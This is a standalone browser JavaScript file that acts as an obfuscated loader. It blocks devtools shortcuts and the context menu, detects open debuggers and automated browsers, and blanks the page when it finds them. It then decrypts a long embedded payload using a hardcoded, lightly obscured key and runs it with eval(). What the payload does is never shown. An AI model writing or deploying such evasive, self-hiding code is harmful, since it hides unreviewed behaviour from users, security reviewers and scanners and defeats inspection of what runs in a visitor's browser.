(async function() {
    
        (function() {
            const kill = () => {
                try {
                    window.onbeforeunload = null;
                    document.documentElement.innerHTML = "";
                    window.location.href = "about:blank";
                    window.location.replace("about:blank");
                    if (window.self === window.top) {
                        window.open("about:blank", "_self");
                    }
                } catch (e) {}
            };

            document.addEventListener('contextmenu', e => { e.preventDefault(); e.stopPropagation(); }, true);
            document.addEventListener('keydown', e => {
                const isMac = navigator.platform.toUpperCase().indexOf('MAC') >= 0;
                const ctrl = isMac ? e.metaKey : e.ctrlKey;
                const fKeys = ['F12', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11'];
                if (fKeys.includes(e.key) || (ctrl && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (ctrl && (e.key === 'u' || e.key === 's' || e.key === 'p')) || (isMac && e.metaKey && e.altKey && (e.key === 'i' || e.key === 'j' || e.key === 'u'))) {
                    e.preventDefault();
                    e.stopPropagation();
                    kill();
                    return false;
                }
            }, true);

            const detect = () => {
                const s = performance.now();
                debugger;
                if (performance.now() - s > 10) kill();
                const element = new Image();
                Object.defineProperty(element, 'id', { get: () => kill() });
                console.log(element);
            };

            window.addEventListener('resize', () => {
                if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) kill();
            });

            setInterval(detect, 500);
            if (navigator.webdriver) kill();

            
        })();
        
    let _p = "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";
    let _authorized = "*";
    let _encK = "fGFqZ24=";
    
    // Domain Lock
    const currentHost = typeof window !== 'undefined' ? window.location.hostname : "";
    if (_authorized !== "*" && _authorized !== "") {
        const allowed = _authorized.split(",").map(d => d.trim());
        if (!allowed.some(d => currentHost.includes(d))) {
            console.error("DOMAIN NOT AUTHORIZED");
            return;
        }
    }

    try {
        let _raw = atob(_encK).split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 0x0F)).join('');
        let HardenedDec = (function(){
            const IT = 100000;
            const S_SZ = 16;
            const I_SZ = 12;
            return {
                async run(base64, pw) {
                    const data = new Uint8Array(atob(base64).split("").map(c => c.charCodeAt(0)));
                    const salt = data.slice(0, S_SZ);
                    const iv = data.slice(S_SZ, S_SZ+I_SZ);
                    const encData = data.slice(S_SZ+I_SZ);
                    const enc = new TextEncoder();
                    const bKey = await crypto.subtle.importKey("raw", enc.encode(pw), "PBKDF2", false, ["deriveKey"]);
                    const key = await crypto.subtle.deriveKey({name:"PBKDF2",salt:salt,iterations:IT,hash:"SHA-512"},bKey,{name:"AES-GCM",length:256},false,["decrypt"]);
                    const dec = await crypto.subtle.decrypt({name:"AES-GCM",iv:iv},key,encData);
                    let s = Array.from(enc.encode(pw)).reduce((a, b) => a + b, 0);
                    const unshuffled = new Uint8Array(dec);
                    for(let i=0; i<unshuffled.length; i++) {
                        s = (s * 16807) % 2147483647;
                        unshuffled[i] = unshuffled[i] ^ (s & 0xFF);
                    }
                    return new TextDecoder().decode(unshuffled);
                }
            };
        })();

        const result = await HardenedDec.run(_p, _raw);
        
        _p = null; _authorized = null; _encK = null; _raw = null; 
        if(typeof HardenedDec !== 'undefined') HardenedDec = null;
        
        eval(result);
    } catch(e) {
        console.error("ENVIRONMENT CHECK FAILED");
    }
})();
